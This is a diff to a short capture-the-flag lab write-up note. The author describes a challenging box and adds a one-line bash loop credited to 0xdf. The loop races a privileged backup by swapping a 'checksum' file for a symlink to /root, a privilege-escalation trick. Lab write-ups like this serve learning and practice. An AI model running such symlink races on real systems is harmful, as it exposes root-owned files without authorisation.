@@ -13,3 +13,6 @@
 ### Note: 
 I really liked this box. It involved a-lot of enumeration. Out of the box thinking.
 A few twitsts and turns and a couple of rabbit holes. There was so much going on with this box.
+What saved me was the below while loop by 0xdf.
+`while :; do if test -f checksum; then rm -f checksum; ln -s /root checksum; echo "Replaced checksum"; sleep 5; echo "Backup probably done now"; break; fi; sleep 1; done`
+
